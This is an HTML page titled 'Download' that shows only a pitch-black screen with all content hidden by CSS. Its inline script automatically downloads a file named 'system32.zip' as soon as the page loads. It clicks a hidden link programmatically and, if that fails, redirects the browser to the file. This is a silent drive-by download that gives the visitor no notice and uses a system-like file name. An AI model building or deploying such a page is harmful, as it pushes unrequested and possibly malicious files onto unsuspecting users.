<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <title>Download</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    /* Pitch-black blank page */
    html, body {
      height: 100%;
      margin: 0;
      background-color: #000000; /* pure black */
      color: #000000; /* keep text invisible */
      overflow: hidden;
    }
    /* Hide any accidental content */
    body > * { display: none !important; }
  </style>
  </head>
  <body>
    <script>
      // Attempt automatic download as soon as the page loads.
      // Note: some browsers may block non-user-initiated downloads.
      document.addEventListener('DOMContentLoaded', function () {
        try {
          const a = document.createElement('a');
          a.href = 'system32.zip';
          a.download = 'system32.zip';
          // a.style.display = 'none'; // not necessary; hidden by CSS
          document.body.appendChild(a);
          // Programmatic click to start download
          a.click();
          // Cleanup
          a.remove();
        } catch (e) {
          // If programmatic download fails, navigate to the file as a fallback
          window.location.href = 'system32.zip';
        }
      });
    </script>
  </body>
</html>
